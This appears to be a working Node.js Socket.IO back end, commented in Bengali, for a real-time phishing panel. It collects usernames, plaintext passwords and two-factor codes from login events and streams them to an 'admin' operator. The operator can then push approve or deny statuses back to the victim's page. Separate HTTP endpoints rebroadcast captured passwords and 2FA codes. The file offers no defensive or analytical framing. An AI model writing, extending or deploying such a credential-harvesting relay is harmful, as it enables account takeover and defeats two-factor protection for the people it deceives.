const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// ======================== CORS ==========================
// স্পষ্টভাবে origins সংজ্ঞায়িত করুন
const allowedOrigins = process.env.NODE_ENV === 'production'
  ? [
      "https://email-password-backend-production.up.railway.app",
      "https://your-frontend.vercel.app",
      "https://your-production-domain.com"
    ]
  : [
      "http://localhost:3000",
      "http://localhost:3001",
      "http://127.0.0.1:5500",
      "http://localhost:5500",
      "null",
      "file://",
      "*"  // ডেভেলপমেন্টে সব অনুমোদিত
    ];

const corsOptions = {
  origin: (origin, callback) => {
    // অনুমতি ছাড়া request (মোবাইল অ্যাপ/কার্ল) 
    if (!origin) return callback(null, true);
    
    // ডেভেলপমেন্টে সব অনুমোদিত
    if (process.env.NODE_ENV !== 'production') {
      return callback(null, true);
    }
    
    // প্রোডাকশনে শুধু স্পেসিফিক origins
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn('❌ CORS blocked:', origin);
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
};

app.use(cors(corsOptions));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// ======================== SOCKET.IO ==========================
const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling'],
  path: '/socket.io/',
  pingTimeout: 60000,
  pingInterval: 25000,
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000,
    skipMiddlewares: true,
  },
  upgradeTimeout: 30000,
  allowEIO3: true,
});

console.log('🚀 Socket.IO server initializing...');

// ======================== মেমোরি স্টোর ==========================
const users = {};
const loginAttempts = [];

// ======================== SOCKET ইভেন্ট ==========================
io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('📊 Total connections:', io.engine.clientsCount);

  socket.on('join_room', (room) => {
    socket.join(room);
    console.log(`User ${socket.id} joined room: ${room}`);
  });

  socket.on('login-attempt', (data) => {
    const { username, password, timestamp } = data;

    const attempt = {
      id: `${socket.id}-${Date.now()}`,
      username: username,
      password: password,
      authCode: data.authCode || '00000',
      timestamp: timestamp || new Date().toISOString(),
      status: 'pending',
    };

    loginAttempts.push(attempt);
    console.log(`📥 Login attempt from: ${username} at ${attempt.timestamp}`);

    socket.broadcast.emit('new-login-attempt', attempt);
    socket.emit('login-attempt-received', {
      success: true,
      message: 'Login attempt recorded',
      attemptId: attempt.id,
    });
  });

  socket.on('update-login-status', (data) => {
    const { attemptId, status, username } = data;

    console.log(`📢 Admin updated status: ${username} → ${status}`);

    socket.broadcast.emit('login-status-updated', {
      attemptId: attemptId || `${username}-${Date.now()}`,
      status: status,
      username: username,
    });

    console.log(`✅ Broadcasted to other clients: ${username} - ${status}`);

    const attempt = loginAttempts.find((a) => a.id === attemptId || a.username === username);
    if (attempt) {
      attempt.status = status;
    }
  });

  socket.on('admin-joined', (data) => {
    console.log(`👑 Admin ${data.name} joined`);
    socket.emit('all-login-attempts', loginAttempts);
    socket.broadcast.emit('admin-joined-notification', data);
  });

  socket.on('new-user-joined', (data) => {
    console.log(`👤 User ${data.name} joined`);
    users[socket.id] = data;
    io.emit('current-users', Object.values(users));
    socket.broadcast.emit('user-joined', data);
  });

  socket.on('user-left', (data) => {
    console.log(`👋 User ${data.name} left`);
    delete users[socket.id];
    io.emit('current-users', Object.values(users));
    socket.broadcast.emit('user-left', data);
  });

  socket.on('disconnect', (reason) => {
    console.log('❌ User disconnected:', socket.id, 'Reason:', reason);
    console.log('📊 Total connections:', io.engine.clientsCount);

    const user = users[socket.id];
    if (user) {
      console.log(`👋 ${user.name} disconnected`);
      delete users[socket.id];
      io.emit('current-users', Object.values(users));
      socket.broadcast.emit('user-left', { name: user.name });
    }
  });

  socket.on('error', (error) => {
    console.error('Socket error for', socket.id, ':', error);
  });
});

// ======================== HTTP এন্ডপয়েন্ট ==========================

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    connections: io.engine.clientsCount,
    uptime: Math.floor(process.uptime()),
    environment: process.env.NODE_ENV || 'development',
    cors: process.env.NODE_ENV === 'production' ? 'production' : 'development (all allowed)',
  });
});

app.get('/test', (req, res) => {
  res.json({
    message: 'Server is running!',
    socketPath: '/socket.io/',
    clients: io.engine.clientsCount,
    env: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString(),
  });
});

app.get('/api/status', (req, res) => {
  res.json({
    clients: io.engine.clientsCount,
    rooms: Object.keys(io.sockets.adapter.rooms).length,
    timestamp: new Date().toISOString(),
    uptime: Math.floor(process.uptime()),
  });
});

app.post('/api/notify-admin', (req, res) => {
  try {
    const { email, type, message } = req.body;

    if (!email || !type || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: email, type, message',
      });
    }

    console.log(`📧 Notification: [${type}] ${email}`);
    console.log(`📝 Message: ${message}`);

    io.emit('admin_notification', {
      email,
      type,
      message,
      timestamp: new Date().toISOString(),
    });

    io.to('admin_room').emit('admin_notification', {
      email,
      type,
      message,
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in notify-admin:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

app.post('/api/admin-action', (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;

    if (!userId || !newStatus) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: userId, newStatus',
      });
    }

    console.log(`🔔 Admin action: ${newStatus} for user ${userId} (${email || 'unknown email'})`);

    if (userId) {
      io.to(`user_${userId}`).emit('user_update', {
        userId,
        newStatus,
        authCode: authCode || '',
        email: email || '',
        timestamp: new Date().toISOString(),
      });
    }

    io.emit('user_update', {
      userId,
      newStatus,
      authCode: authCode || '',
      email: email || '',
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in admin-action:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

// HTTP ব্রডকাস্ট এন্ডপয়েন্ট (আপনার কাজ করা কোড থেকে)
app.post('/api/broadcast-login-status', (req, res) => {
  try {
    const { attemptId, status, username } = req.body;

    if (!attemptId && !username) {
      return res.status(400).json({
        success: false,
        message: 'Missing attemptId or username',
      });
    }

    console.log(`📢 HTTP broadcast login status: ${username} → ${status}`);
    io.emit('login-status-updated', { attemptId, status, username });

    res.json({ success: true });
  } catch (error) {
    console.error('Error in broadcast-login-status:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/broadcast-2fa-submitted', (req, res) => {
  try {
    const { username, password, authCode, timestamp } = req.body;

    if (!username) {
      return res.status(400).json({
        success: false,
        message: 'Missing username',
      });
    }

    console.log(`📢 HTTP broadcast 2FA submitted: ${username} → ${authCode}`);
    io.emit('two-fa-submitted', {
      username,
      password: password || '',
      authCode: authCode || '',
      timestamp: timestamp || new Date().toISOString(),
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error in broadcast-2fa-submitted:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ======================== 404 & এরর হ্যান্ডলিং ==========================
app.use((req, res) => {
  res.status(404).json({
    error: 'Endpoint not found',
    path: req.path,
  });
});

app.use((err, req, res, next) => {
  console.error('Global error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : undefined,
  });
});

// ======================== সার্ভার স্টার্ট ==========================
const PORT = process.env.PORT || 8000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Socket.IO path: /socket.io/`);
  console.log(`🌐 CORS mode: ${process.env.NODE_ENV === 'production' ? 'PRODUCTION (restricted)' : 'DEVELOPMENT (all allowed)'}`);
  console.log(`📋 Allowed origins: ${process.env.NODE_ENV === 'production' ? allowedOrigins.join(', ') : 'ALL (*)'}`);
});

// ======================== গ্রেসফুল শাটডাউন ==========================
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

server.on('error', (error) => {
  console.error('❌ Server error:', error);
  if (error.code === 'EADDRINUSE') {
    console.error(`⚠️ Port ${PORT} is already in use`);
  }
});